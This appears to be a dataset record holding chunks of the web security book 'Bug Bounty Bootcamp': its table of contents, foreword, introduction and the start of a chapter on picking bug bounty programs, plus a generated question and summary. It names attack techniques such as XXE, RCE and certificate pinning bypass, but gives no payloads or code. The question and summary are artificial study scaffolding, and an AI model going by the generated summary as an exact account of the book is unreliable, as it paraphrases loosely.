. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 245\nFinding Your First Insecure Deserialization!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 246\n15\nXML EXTERNAL ENTITY 247\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 247\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 249\nHunting for XXEs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 250\nStep 1: Find XML Data Entry Points  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 250\nStep 2: Test for Classic XXE  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 251\nStep 3: Test for Blind XXE . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 252\nxiv Contents in Detail\nStep 4: Embed XXE Payloads in Different File Types . . . . . . . . . . . . . . . . . . . 253\nStep 5: Test for XInclude Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 254\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 254\nReading Files  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 255\nLaunching an SSRF  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 255\nUsing Blind XXEs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 256\nPerforming Denial-of-Service Attacks  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 258\nMore About Data Exfiltration Using XXEs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 259\nFinding Your First XXE!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 260\n16\nTEMPLATE INJECTION 261\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 262\nTemplate Engines  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 262\nInjecting Template Code . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 263\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 265\nHunting for Template Injection  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 266\nStep 1: Look for User-Input Locations  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 266\nStep 2: Detect Template Injection by Submitting Test Payloads . . . . . . . . . . . . 266\nStep 3: Determine the Template Engine in Use  . . . . . . . . . . . . . . . . . . . . . . 268\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 268\nSearching for System Access via Python Code  . . . . . . . . . . . . . . . . . . . . . . 269\nEscaping the Sandbox by Using Python Built-in Functions . . . . . . . . . . . . . . . 270\nSubmitting Payloads for Testing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 273\nAutomating Template Injection . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 273\nFinding Your First Template Injection!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 274\n17\nAPPLICATION LOGIC ERRORS AND BROKEN ACCESS CONTROL 275\nApplication Logic Errors  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 276\nBroken Access Control  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 278\nExposed Admin Panels . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 278\nDirectory Traversal Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 279\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 279\nHunting for Application Logic Errors and Broken Access Control  . . . . . . . . . . . . . . . . 280\nStep 1: Learn About Your Target  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 280\nStep 2: Intercept Requests While Browsing . . . . . . . . . . . . . . . . . . . . . . . . . 280\nStep 3: Think Outside the Box . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 280\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 281\nFinding Your First Application Logic Error or Broken Access Control!  . . . . . . . . . . . . . 281\n18\nREMOTE CODE EXECUTION 283\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 284\nCode Injection  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 284\nFile Inclusion . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 286\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 287\nHunting for RCEs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 288\nStep 1: Gather Information About the Target . . . . . . . . . . . . . . . . . . . . . . . . 289\nStep 2: Identify Suspicious User Input Locations . . . . . . . . . . . . . . . . . . . . . . 289\nContents in Detail xv\nStep 3: Submit Test Payloads  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 289\nStep 4: Confirm the Vulnerability . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 290\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 291\nBypassing RCE Protection  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 291\nFinding Your First RCE! . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 293\n19\nSAME-ORIGIN POLICY VULNERABILITIES 295\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 296\nExploiting Cross-Origin Resource Sharing . . . . . . . . . . . . . . . . . . . . . . . . . . 297\nExploiting postMessage() . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 298\nExploiting JSON with Padding  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 300\nBypassing SOP by Using XSS . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 302\nHunting for SOP Bypasses . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 302\nStep 1: Determine If SOP Relaxation Techniques Are Used . . . . . . . . . . . . . . 302\nStep 2: Find CORS Misconfiguration . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 303\nStep 3: Find postMessage Bugs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 304\nStep 4: Find JSONP Issues . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 305\nStep 5: Consider Mitigating Factors  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 305\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 305\nFinding Your First SOP Bypass Vulnerability!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 306\n20\nSINGLE-SIGN-ON SECURITY ISSUES 307\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 308\nCooking Sharing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 308\nSecurity Assertion Markup Language . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 309\nOAuth . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 312\nHunting for Subdomain Takeovers  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 316\nStep 1: List the Target’s Subdomains  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 316\nStep 2: Find Unregistered Pages . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 316\nStep 3: Register the Page . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 317\nMonitoring for Subdomain Takeovers  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 318\nHunting for SAML Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 319\nStep 1: Locate the SAML Response  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 319\nStep 2: Analyze the Response Fields  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  .  . 319\nStep 3: Bypass the Signature  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 319\nStep 4: Re-encode the Message  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 320\nHunting for OAuth Token Theft . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 320\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 321\nFinding Your First SSO Bypass!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 321\n21\nINFORMATION DISCLOSURE 323\nMechanisms  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 324\nPrevention . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 324\nHunting for Information Disclosure  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 325\nStep 1: Attempt a Path Traversal Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . 325\nStep 2: Search the Wayback Machine . . . . . . . . . . . . . . . . . . . . . . . . . . . . 326\nxvi Contents in Detail\nStep 3: Search Paste Dump Sites . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 327\nStep 4: Reconstruct Source Code from an Exposed  .git Directory  . . . . . . . . . 328\nStep 5: Find Information in Public Files . . . . . . . . . . . . . . . . . . . . . . . . . . . . 331\nEscalating the Attack  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 332\nFinding Your First Information Disclosure!  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 332\nPART IV: EXPERT TECHNIQUES 333\n22\nCONDUCTING CODE REVIEWS 335\nWhite-Box vs . Black-Box Testing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 336\nThe Fast Approach: grep Is Your Best Friend  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 336\nDangerous Patterns . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 336\nLeaked Secrets and Weak Encryption  . . . . . . . . . . . . . . . . . . . . . . . . . . . . 338\nNew Patches and Outdated Dependencies . . . . . . . . . . . . . . . . . . . . . . . . . 340\nDeveloper Comments . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 340\nDebug Functionalities, Configuration Files, and Endpoints  . . . . . . . . . . . . . . 340\nThe Detailed Approach . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341\nImportant Functions . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 341\nUser Input  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 342\nExercise: Spot the Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 344\n23\nHACKING ANDROID APPS 347\nSetting Up Your Mobile Proxy  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 348\nBypassing Certificate Pinning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 349\nAnatomy of an APK  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 350\nTools to Use . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351\nAndroid Debug Bridge . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 351\nAndroid Studio . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 352\nApktool  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 352\nFrida . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 353\nMobile Security Framework  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 353\nHunting for Vulnerabilities . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 353\n24\nAPI HACKING 355\nWhat Are APIs? . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 355\nREST APIs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 357\nSOAP APIs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 358\nGraphQL APIs  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 358\nAPI-Centric Applications . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 361\nHunting for API Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 362\nPerforming Recon  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 362\nTesting for Broken Access Control and Info Leaks  . . . . . . . . . . . . . . . . . . . . 364\nTesting for Rate-Limiting Issues . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 365\nTesting for Technical Bugs . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 366\nContents in Detail xvii\n25\nAUTOMATIC VULNERABILITY DISCOVERY USING FUZZERS 369\nWhat Is Fuzzing? . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 370\nHow a Web Fuzzer Works  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 370\nThe Fuzzing Process . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 371\nStep 1: Determine the Data Injection Points  . . . . . . . . . . . . . . . . . . . . . . . . 371\nStep 2: Decide on the Payload List  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 372\nStep 3: Fuzz . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 372\nStep 4: Monitor the Results . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 374\nFuzzing with Wfuzz . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 374\nPath Enumeration  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 374\nBrute-Forcing Authentication . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 376\nTesting for Common Web Vulnerabilities  . . . . . . . . . . . . . . . . . . . . . . . . . . 377\nMore About Wfuzz . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 378\nFuzzing vs . Static Analysis  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 378\nPitfalls of Fuzzing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 378\nAdding to Your Automated Testing Toolkit  . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 379\nINDEX 381\nxviii Contents in Detail\nFORE WORD\nTwenty or even ten years ago, hackers like me were arrested for trying to\ndo good. Today, we are being hired by some of the world’s most powerful\norganizations.\nIf you’re still considering whether or not you are late to the bug bounty\ntrain, know that you’re coming aboard at one of the most exciting times in\nthe industry’s history. This community is growing faster than ever before,\nas governments are beginning to require that companies host vulnerability\ndisclosure programs, Fortune 500 companies are building such policies\nin droves, and the applications for hacker-powered security are expand-\ning every day. The value of a human eye will forever be vital in defending\nagainst evolving threats, and the world is recognizing us as the people to\nprovide it.\nThe beautiful thing about the bug bounty world is that, unlike your typi-\ncal nine-to-five job or consultancy gig, it allows you to participate from wher-\never you want, whenever you want, and on whatever type of asset you like!\nAll you need is a decent internet connection, a nice coffee (or your choice of\nbeverage), some curiosity, and a passion for breaking things. And not only\ndoes it give you the freedom to work on your own schedule, but the threats\nare evolving faster than the speed of innovation, providing ample opportu-\nnities to learn, build your skills, and become an expert in a new area.\nIf you are interested in gaining real-world hacking experience, the bug\nbounty marketplace makes that possible by providing an endless number of\ntargets owned by giant companies such as Facebook, Google, or Apple! I’m\nnot saying that it is an easy task to find a vulnerability in these companies;\nnevertheless, bug bounty programs deliver the platform on which to hunt,\nand the bug bounty community pushes you to learn more about new vulner-\nability types, grow your skill set, and keep trying even when it gets tough.\nUnlike most labs and Capture the Flags (CTFs), bug bounty programs do\nnot have solutions or a guaranteed vulnerability to exploit. Instead, you’ll\nalways ask yourself whether or not some feature is vulnerable, or if it can\nforce the application or its functionalities to do things it’s not supposed to.\nThis uncertainty can be daunting, but it makes the thrill of finding a bug so\nmuch sweeter.\nIn this book, Vickie explores a variety of different vulnerability types\nto advance your understanding of web application hacking. She covers the\nskills that will make you a successful bug bounty hunter, including step-\nby-step analyses on how to pick the right program for you, perform proper\nreconnaissance, and write strong reports. She provides explanations for\nattacks like cross-site scripting, SQL injection, template injection, and\nalmost any other you need in your toolkit to be successful. Later on, she\ntakes you beyond the basics of web applications and introduces topics such\nas code review, API hacking, automating your workflow, and fuzzing.\nFor anyone willing to put in the work, Bug Bounty Bootcamp gives you the\nfoundation you need to make it in bug bounties.\n—Ben Sadeghipour\nHacker, Content Creator, and\nHead of Hacker Education at HackerOne\nxx Foreword\nINTRODUCTION\nI still remember the first time I found a\nhigh-impact vulnerability. I had already\nlocated a few low-impact bugs in the applica-\ntion I was testing, including a CSRF, an IDOR,\nand a few information leaks. Eventually, I managed\nto chain these into a full takeover of any account on\nthe website: I could have logged in as anyone, read\nanyone’s data, and altered it however I wanted. For an\ninstant, I felt like I had superpowers.\nI reported the issue to the company, which promptly fixed the vulnerabil-\nity. Hackers are probably the closest thing to superheroes I’ve encountered in\nthe real world. They overcome limitations with their skills to make software\nprograms do much more than they were designed for, which is what I love\nabout hacking web applications: it’s all about thinking creatively, challenging\nyourself, and doing more than what seems possible.\nAlso like superheroes, ethical hackers help keep society safe. Thousands\nof data breaches happen every year in the United States alone. By under-\nstanding vulnerabilities and how they happen, you can use your knowledge\nfor good to help prevent malicious attacks, protect applications and users,\nand make the internet a safer place.\nNot too long ago, hacking and experimenting with web applications\nwere illegal. But now, thanks to bug bounty programs, you can hack legally;\ncompanies set up bug bounty programs to reward security researchers for\nfinding vulnerabilities in their applications. Bug Bounty Bootcamp teaches\nyou how to hack web applications and how to do it legally by participating\nin these programs. You’ll learn how to navigate bug bounty programs, per-\nform reconnaissance on a target, and identify and exploit vulnerabilities.\nWho This Book Is For\nThis book will help anyone learn web hacking and bug bounty hunting\nfrom scratch. You might be a student looking to get into web security, a web\ndeveloper who wants to understand the security of a website, or an experi-\nenced hacker who wants to understand how to attack web applications. If\nyou are curious about web hacking and web security, this book is for you.\nNo technical background is needed to understand and master the material\nof this book. However, you will find it useful to understand basic programming.\nAlthough this book was written with beginners in mind, advanced hack-\ners may also find it to be a useful reference. In particular, I discuss advanced\nexploitation techniques and useful tips and tricks I’ve learned along the way.\nWhat Is In This Book\nBug Bounty Bootcamp covers everything you need to start hacking web appli-\ncations and participating in bug bounty programs. This book is broken into\nfour parts: The Industry, Getting Started, Web Vulnerabilities, and Expert\nTechniques.\nPart I: The Industry\nThe first part of the book focuses on the bug bounty industry. Chapter 1:\nPicking a Bug Bounty Program explains the various types of bug bounty\nprograms and how to choose one that suits your interests and experience\nlevel. Chapter 2: Sustaining Your Success teaches you the nontechnical\nskills you need to succeed in the bug bounty industry, like writing a good\nreport, building professional relationships, and dealing with conflict and\nfrustration.\nPart II: Getting Started\nThe second part of the book prepares you for web hacking and intro-\nduces you to the basic technologies and tools you’ll need to successfully\nhunt for bugs.\nxxii Introduction\nChapter 3: How the Internet Works explains the basics of internet tech-\nnologies. It also introduces the internet security mechanisms you will\nencounter, such as session management, token-based authentication,\nand the same-origin policy.\nChapter 4: Environmental Setup and Traffic Interception shows you\nhow to set up your hacking environment, configure Burp Suite, and\neffectively utilize Burp Suite’s various modules to intercept traffic and\nhunt for bugs.\nChapter 5: Web Hacking Reconnaissance details the recon strategies\nyou can take to gather information about a target. It also includes an\nintroduction to bash scripting and shows you how to create an auto-\nmated recon tool from scratch.\nPart III: Web Vulnerabilities\nThen we start hacking! This part, the core of the book, dives into the\ndetails of specific vulnerabilities. Each chapter is dedicated to a vulner-\nability and explains what causes that vulnerability, how to prevent it,\nand how to find, exploit, and escalate it for maximum impact.\nChapters 6 through 18 discuss common vulnerabilities you are likely to\nencounter in real-life applications, including cross-site scripting (XSS),\nopen redirects, clickjacking, cross-site request forgery (CSRF), insecure\ndirect object references (IDOR), SQL injection, race conditions, server-\nside request forgery (SSRF), insecure deserialization, XML external\nentity vulnerabilities (XXE), template injection, application logic errors\nand broken access control, and remote code execution (RCE).\nChapter 19: Same-Origin Policy Vulnerabilities dives into a fundamen-\ntal defense of the modern internet: the same-origin policy. You’ll learn\nabout the mistakes developers make when building applications to\nwork around the same-origin policy and how hackers can exploit these\nmistakes.\nChapter 20: Single-Sign-On Security Issues discusses the most common\nways applications implement single-sign-on features, the potential weak-\nnesses of each method, and how you can exploit these weaknesses.\nFinally, Chapter 21: Information Disclosure discusses several ways of\nextracting sensitive information from a web application.\nPart IV: Expert Techniques\nThe final part of the book introduces in-depth techniques for the expe-\nrienced hacker. This section will help you advance your skills once you\nunderstand the basics covered in Part III.\nChapter 22: Conducting Code Reviews teaches you how to identify\nvulnerabilities in source code. You will also get the chance to practice\nreviewing a few pieces of code.\nIntroduction xxiii\nChapter 23: Hacking Android Apps teaches you how to set up your\nmobile hacking environment and find vulnerabilities in Android\napplications.\nChapter 24: API Hacking discusses application programming interfaces\n(APIs), an essential part of many modern applications. I discuss types\nof APIs and how to hunt for vulnerabilities that manifest in them.\nChapter 25: Automatic Vulnerability Discovery Using Fuzzers wraps up\nthe book by showing you how to automatically hunt for vulnerabilities\nby using a method called fuzzing. You’ll practice fuzzing a web applica-\ntion with an open source fuzzer.\nHappy Hacking!\nBug Bounty Bootcamp is not simply a book about bug bounties. It is a manual for\naspiring hackers, penetration testers, and people who are curious about how\nsecurity works on the internet. In the following chapters, you will learn how\nattackers exploit common programming mistakes to achieve malicious goals\nand how you can help companies by ethically reporting these vulnerabilities\nto their bug bounty programs. Remember to wield this power responsibly!\nThe information in this book should be used strictly for legal purposes. Attack\nonly systems you have permission to hack and always exercise caution when\ndoing so. Happy hacking!\nxxiv Introduction",
    "question": "What is the main purpose and focus of the book \"Bug Bounty Bootcamp\"?",
    "summary": "The book \"Bug Bounty Bootcamp\" provides an overview of the bug bounty industry, guiding readers through selecting the right program, writing effective reports, and building relationships with development teams. It then covers the fundamentals of web hacking, including how the internet works, setting up a hacking environment, and conducting reconnaissance. The core of the book focuses on various web vulnerabilities such as cross-site scripting, SQL injection, and clickjacking, explaining their mechanisms, prevention strategies, and exploitation techniques. Finally, it introduces advanced techniques like code reviews, API hacking, and using fuzzers to automatically discover vulnerabilities. The book aims to equip readers with the knowledge and skills needed to participate in bug bounty programs and contribute to improving web application security."
  },
  {
    "start": 7,
    "end": 17,
    "text": "1\nPICKING A BUG BOUNT Y\nPROGR AM\nBug bounty programs: are they all the\nsame? Finding the right program to target\nis the first step to becoming a successful bug\nbounty hunter. Many programs have emerged\nwithin the past few years, and it’s difficult to figure out\nwhich ones will provide the best monetary rewards,\nexperience, and learning opportunities.\nA bug bounty program is an initiative in which a company invites hackers to\nattack its products and service offerings. But how should you pick a program?\nAnd how should you prioritize their different metrics, such as the asset types\ninvolved, whether the program is hosted on a platform, whether it’s public or\nprivate, the program’s scope, the payout amounts, and response times?\nIn this chapter, we’ll explore types of bug bounty programs, analyze\nthe benefits and drawbacks of each, and figure out which one you should\ngo for.\nThe State of the Industry\nBug bounties are currently one of the most popular ways for organizations\nto receive feedback about security bugs. Large corporations, like PayPal\nand Facebook, as well as government agencies like the US Department\nof Defense, have all embraced the idea. Yet not too long ago, reporting a\nvulnerability to a company would have more likely landed you in jail than\ngotten you a reward.\nIn 1995, Netscape launched the first-ever bug bounty program. The\ncompany encouraged users to report bugs found in its brand-new browser,\nthe Netscape Navigator 2.0, introducing the idea of crowdsourced security\ntesting to the internet world. Mozilla launched the next corporate bug\nbounty program nine years later, in 2004, inviting users to identify bugs in\nthe Firefox browser.\nBut it was not until the 2010s that offering bug bounties become a popu-\nlar practice. That year, Google launched its program, and Facebook followed\nsuit in 2011. These two programs kick-started the trend of using bug boun-\nties to augment a corporation’s in-house security infrastructure.\nAs bug bounties became a more well-known strategy, bug-bounty-as-a-\nservice platforms emerged. These platforms help companies set up and oper-\nate their programs. For example, they provide a place for companies to host\ntheir programs, a way to process reward payments, and a centralized place\nto communicate with bug bounty hunters.\nThe two largest of these platforms, HackerOne and Bugcrowd, both\nlaunched in 2012. After that, a few more platforms, such as Synack, Cobalt,\nand Intigriti, came to the market. These platforms and managed bug bounty\nservices allow even companies with limited resources to run a security pro-\ngram. Today, large corporations, small startups, nonprofits, and government\nagencies alike have adopted bug bounties as an additional security mea-\nsure and a fundamental piece of their security policies. You can read more\nabout the history of bug bounty programs at https://en.wikipedia.org/wiki/Bug\n_bounty_program.\nThe term security program usually refers to information security policies,\nprocedures, guidelines, and standards in the larger information security\nindustry. In this book, I use program or bug bounty program to refer to a com-\npany’s bug bounty operations. Today, tons of programs exist, all with their\nunique characteristics, benefits, and drawbacks. Let’s examine these.\nAsset Types\nIn the context of a bug bounty program, an asset is an application, website,\nor product that you can hack. There are different types of assets, each with\nits own characteristics, requirements, and pros and cons. After considering\nthese differences, you should choose a program with assets that play to your\nstrengths, based on your skill set, experience level, and preferences.\n4 Chapter 1\nSocial Sites and Applications\nAnything labeled social has a lot of potential for vulnerabilities, because\nthese applications tend to be complex and involve a lot of interaction among\nusers, and between the user and the server. That’s why the first type of bug\nbounty program we’ll talk about targets social websites and applications.\nThe term social application refers to any site that allows users to interact with\neach other. Many programs belong to this category: examples include the\nbug bounty program for HackerOne and programs for Facebook, Twitter,\nGitHub, and LINE.\nSocial applications need to manage interactions among users, as well as\neach user’s roles, privileges, and account integrity. They are typically full of\npotential for critical web vulnerabilities such as insecure direct object refer-\nences (IDORs), info leaks, and account takeovers. These vulnerabilities occur\nwhen many users are on a platform, and when applications mismanage user\ninformation; when the application does not validate a user’s identity properly,\nmalicious users can assume the identity of others.\nThese complex applications also often provide a lot of user input\nopportunities. If input validation is not performed properly, these applica-\ntions are prone to injection bugs, like SQL injection (SQLi) or cross-site\nscripting (XSS).\nIf you are a newcomer to bug bounties, I recommend that you start with\nsocial sites. The large number of social applications nowadays means that\nif you target social sites, you’ll have many programs to choose from. Also,\nthe complex nature of social sites means that you’ll encounter a vast attack\nsurface with which to experiment. (An application’s attack surface refers\nto all of the application’s different points that an attacker can attempt to\nexploit.) Finally, the diverse range of vulnerabilities that show up on these\nsites means that you will be able to quickly build a deep knowledge of web\nsecurity.\nThe skill set you need to hack social programs includes the ability to\nuse a proxy, like the Burp Suite proxy introduced in Chapter 4, and knowl-\nedge about web vulnerabilities such as XSS and IDOR. You can learn more\nabout these in Chapters 6 and 10. It’s also helpful to have some JavaScript\nprogramming skills and knowledge about web development. However, these\nskills aren’t required to succeed as a hacker.\nBut these programs have a major downside. Because of the popularity\nof their products and the low barrier of entry, they’re often very competitive\nand have many hackers hunting on them. Social media platforms such as\nFacebook and Twitter are some of the most targeted programs.\nGeneral Web Applications\nGeneral web applications are also a good target for beginners. Here, I am refer-\nring to any web applications that do not involve user-to-user interaction.\nInstead, users interact with the server to access the application’s features.\nTargets that fall into these categories can include static websites, cloud appli-\ncations, consumer services like banking sites, and web portals of Internet of\nThings (IoT) devices or other connected hardware. Like social sites, they\nPicking a Bug Bounty Program 5\nare also quite diverse and lend themselves well to a variety of skill levels.\nExamples include the programs for Google, the US Department of Defense,\nand Credit Karma.\nThat said, in my experience, they tend to be a little more difficult to\nhack than social applications, and their attack surface is smaller. If you’re\nlooking for account takeovers and info leak vulnerabilities, you won’t have\nas much luck because there aren’t a lot of opportunities for users to interact\nwith others and potentially steal their information. The types of bugs that\nyou’ll find in these applications are slightly different. You’ll need to look for\nserver-side vulnerabilities and vulnerabilities specific to the application’s\ntechnology stack. You could also look for commonly found network vulner-\nabilities, like subdomain takeovers. This means you’ll have to know about\nboth client-side and server-side web vulnerabilities, and you should have the\nability to use a proxy. It’s also helpful to have some knowledge about web\ndevelopment and programming.\nThese programs can range in popularity. However, most of them have a\nlow barrier of entry, so you can most likely get started hacking right away!\nMobile Applications (Android, iOS, and Windows)\nAfter you get the hang of hacking web applications, you may choose to spe-\ncialize in mobile applications. Mobile programs are becoming prevalent; after\nall, most web apps have a mobile equivalent nowadays. They include pro-\ngrams for Facebook Messenger, the Twitter app, the LINE mobile app, the\nYelp app, and the Gmail app.\nHacking mobile applications requires the skill set you’ve built from\nhacking web applications, as well as additional knowledge about the struc-\nture of mobile apps and programming techniques related to the platform.\nYou should understand attacks and analysis strategies like certificate pin-\nning bypass, mobile reverse engineering, and cryptography.\nHacking mobile applications also requires a little more setup than\nhacking web applications, as you’ll need to own a mobile device that you\ncan experiment on. A good mobile testing lab consists of a regular device,\na rooted device, and device emulators for both Android and 